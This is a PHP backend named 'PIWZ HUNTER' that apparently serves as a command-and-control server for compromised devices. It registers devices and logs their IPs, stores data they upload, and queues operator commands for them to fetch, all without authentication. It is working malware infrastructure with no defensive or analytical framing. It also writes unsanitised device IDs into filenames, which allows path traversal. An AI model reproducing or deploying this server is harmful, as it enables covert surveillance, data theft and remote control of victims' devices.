<?php
// PIWZ HUNTER API BACKEND
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// CONFIG
$LOG_FILE = 'logs.txt';
$DEVICES_FILE = 'devices.json';

// CREATE FILES IF NOT EXISTS
if (!file_exists($LOG_FILE)) file_put_contents($LOG_FILE, '');
if (!file_exists($DEVICES_FILE)) file_put_contents($DEVICES_FILE, '[]');

// GET ACTION
$action = $_GET['action'] ?? $_POST['action'] ?? '';

// LOG FUNCTION
function logActivity($message) {
    global $LOG_FILE;
    $time = date('Y-m-d H:i:s');
    $log = "[$time] $message\n";
    file_put_contents($LOG_FILE, $log, FILE_APPEND);
}

// HANDLE DEVICE REGISTRATION
if ($action === 'register') {
    $deviceId = $_POST['device_id'] ?? uniqid('DEV-', true);
    $deviceInfo = json_decode($_POST['device_info'] ?? '{}', true);
    
    $devices = json_decode(file_get_contents($DEVICES_FILE), true);
    
    // CHECK IF DEVICE EXISTS
    $found = false;
    foreach ($devices as &$device) {
        if ($device['id'] === $deviceId) {
            $device['last_seen'] = time();
            $device['online'] = true;
            $found = true;
            break;
        }
    }
    
    // ADD NEW DEVICE
    if (!$found) {
        $devices[] = [
            'id' => $deviceId,
            'info' => $deviceInfo,
            'first_seen' => time(),
            'last_seen' => time(),
            'online' => true,
            'ip' => $_SERVER['REMOTE_ADDR']
        ];
    }
    
    file_put_contents($DEVICES_FILE, json_encode($devices, JSON_PRETTY_PRINT));
    logActivity("Device registered: $deviceId");
    
    echo json_encode([
        'status' => 'success',
        'device_id' => $deviceId,
        'command' => 'wait'
    ]);
    exit;
}

// HANDLE DATA UPLOAD FROM DEVICE
if ($action === 'upload') {
    $deviceId = $_POST['device_id'] ?? 'unknown';
    $dataType = $_POST['type'] ?? 'unknown';
    $data = $_POST['data'] ?? '';
    
    // SAVE DATA TO SEPARATE FILE
    $dataFile = "data_{$deviceId}_{$dataType}_" . time() . ".json";
    file_put_contents($dataFile, json_encode([
        'device' => $deviceId,
        'type' => $dataType,
        'data' => $data,
        'timestamp' => time()
    ], JSON_PRETTY_PRINT));
    
    logActivity("Data received from $deviceId - Type: $dataType");
    
    echo json_encode(['status' => 'success']);
    exit;
}

// GET DEVICE LIST
if ($action === 'get_devices') {
    $devices = json_decode(file_get_contents($DEVICES_FILE), true);
    
    // MARK OFFLINE DEVICES (LAST SEEN > 5 MINUTES)
    $currentTime = time();
    foreach ($devices as &$device) {
        if ($currentTime - $device['last_seen'] > 300) {
            $device['online'] = false;
        }
    }
    
    echo json_encode([
        'status' => 'success',
        'devices' => $devices,
        'count' => count($devices),
        'online' => count(array_filter($devices, fn($d) => $d['online']))
    ]);
    exit;
}

// SEND COMMAND TO DEVICE
if ($action === 'send_command') {
    $deviceId = $_POST['device_id'] ?? '';
    $command = $_POST['command'] ?? '';
    $params = $_POST['params'] ?? [];
    
    if (empty($deviceId) || empty($command)) {
        echo json_encode(['status' => 'error', 'message' => 'Missing parameters']);
        exit;
    }
    
    // SAVE COMMAND TO PENDING FILE
    $cmdFile = "pending_{$deviceId}.json";
    file_put_contents($cmdFile, json_encode([
        'command' => $command,
        'params' => $params,
        'timestamp' => time()
    ], JSON_PRETTY_PRINT));
    
    logActivity("Command sent to $deviceId: $command");
    
    echo json_encode([
        'status' => 'success',
        'message' => 'Command queued'
    ]);
    exit;
}

// GET PENDING COMMAND FOR DEVICE
if ($action === 'get_command') {
    $deviceId = $_GET['device_id'] ?? '';
    
    if (empty($deviceId)) {
        echo json_encode(['status' => 'error', 'message' => 'Missing device_id']);
        exit;
    }
    
    $cmdFile = "pending_{$deviceId}.json";
    
    if (file_exists($cmdFile)) {
        $command = json_decode(file_get_contents($cmdFile), true);
        unlink($cmdFile); // REMOVE AFTER READING
        
        echo json_encode([
            'status' => 'success',
            'command' => $command
        ]);
    } else {
        echo json_encode([
            'status' => 'success',
            'command' => null
        ]);
    }
    exit;
}

// DEFAULT RESPONSE
echo json_encode([
    'status' => 'error',
    'message' => 'Invalid action',
    'available_actions' => ['register', 'upload', 'get_devices', 'send_command', 'get_command']
]);
?>
